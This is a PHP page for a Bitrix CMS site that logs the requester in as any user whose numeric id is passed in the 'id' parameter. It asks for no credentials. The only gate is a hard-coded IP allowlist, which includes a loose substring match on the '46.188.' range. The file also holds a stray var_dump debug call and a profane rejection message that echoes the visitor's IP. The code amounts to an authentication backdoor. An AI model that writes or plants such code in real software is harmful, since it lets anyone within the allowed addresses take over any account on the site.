<?require($_SERVER["DOCUMENT_ROOT"]."/bitrix/modules/main/include/prolog_before.php");
/** @var $USER */

var_dump(stripos($_SERVER["REMOTE_ADDR"],"46.188.124"));
if($_SERVER["REMOTE_ADDR"] == "85.235.188.62" || $_SERVER["REMOTE_ADDR"] == "89.175.188.38" || $_SERVER["REMOTE_ADDR"] == "85.249.43.160" || stripos($_SERVER["REMOTE_ADDR"],"46.188.") !== false)
{
     if(!empty($_REQUEST["id"])) {
         $USER->Authorize(intval($_REQUEST["id"]));
         LocalRedirect("/personal/");
     }
} else echo "FUCK OFF! SERVER['REMOTE_ADDR'] = ".$_SERVER["REMOTE_ADDR"];

require($_SERVER["DOCUMENT_ROOT"]."/bitrix/modules/main/include/epilog_after.php");?>